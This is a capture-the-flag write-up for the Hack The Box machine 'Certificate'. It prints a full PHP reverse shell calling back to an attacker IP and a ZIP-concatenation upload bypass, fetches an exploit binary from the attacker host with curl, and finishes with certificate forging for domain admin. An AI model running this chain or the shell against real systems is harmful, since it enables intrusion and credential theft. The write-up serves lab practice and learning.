
# HTB Certificate - Writeup

**Platform:** Windows  
**IP:** 10.10.11.71  
**Difficulty:** Hard  
**Author:** NoSec

---

## Recon

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

### Clock-skew

- Time synchronization is required for Kerberos!
```bash
sudo rdate -n certificate.htb
```

---

## Web Exploitation – RCE via Upload

You can register on the site and click “Enroll” on any course to get a URL like:
```
http://certificate.htb/upload.php?s_id=36
```

It only allows uploading PDF and ZIP files.  
I used a ZIP concatenation trick so that the actual PHP shell is appended at the end while keeping a valid ZIP structure.

### Steps

1. Create a PHP reverse shell (`shell.php`)
   
   ```bash
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.8';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; powershell -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

3. Create an empty PDF (e.g. `test.pdf`)  
4. Merge ZIPs:
```bash
zip head.zip test.pdf
zip -r tail.zip nosechere   # nosechere/shell.php
cat head.zip tail.zip > main.zip
```
4. Upload `main.zip`  
5. Browse to:
```
http://certificate.htb/static/uploads/[...]/nosechere/shell.php
```
6. Netcat listener:
```bash
nc -lvnp 4444
```

Initial shell user: `xamppuser`

---

## Database Enumeration & Access

```cmd
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;" -E
```

- **Username:** `sara.b`
- **Bcrypt Hash:** `$2y$04$CgDe/...`

### Cracking

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

→ **Password:** `Bl******`

### WinRM

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Bl******'
```

⚠️ **Note:** HTB patched the password reset trick on June 10, 2025!

---

## PCAP Analysis – Kerberos Hash Extraction

```bash
python krb5_roast_parser.py WS-01_PktMon.pcap as_req >> hash.txt
```

### Hashcat Crack

```bash
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

→ **Password:** `!QA*****`

---

## Certipy – PFX Requests

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "!QA..." ...
certipy req ... -on-behalf-of 'CERTIFICATE\ryan.k'
certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
```

→ Got `ryan.k` hash  
→ Logged in via WinRM as `ryan.k`

---

## Privilege Escalation

```powershell
whoami /priv
# SeManageVolumePrivilege
```

Exploit:
```powershell
curl 10.10.14.8/SeManageVolumeExploit.exe -O ...
.\SeManageVolumeExploit.exe
```

Test:
```powershell
echo "test" > C:\Windows	est.txt
```

---

## Export CA & Forge Admin Certificate

```powershell
certutil -exportPFX my "Certificate-LTD-CA" C:	emp\ca.pfx
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
```

Get NTLM hash:
```bash
certipy auth -dc-ip '10.10.11.71' -pfx forged_admin.pfx ...
```

---

## Root / Administrator Access

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d80430...
```

→ `root.txt` captured ✅

---

## 🧠 Notes & Reflections – What I learned from this box

- Full AD attack chain
- ZIP concat trick
- ADCS/PKI abuse
- Kerberoasting from PCAP
- Shadow Credentials
- Certificate forging

---

## ⚠️ Mistakes, Pitfalls & Tips

- Time sync is a must!
- Password reset was patched (June 10, 2025)

---

## ✅ Summary

*Certificate* is an excellent ADCS compromise lab.  
Recommended for anyone getting into Red/Blue Teaming, PKI abuse, and modern AD attacks.

Feel free to reach out if you have questions!
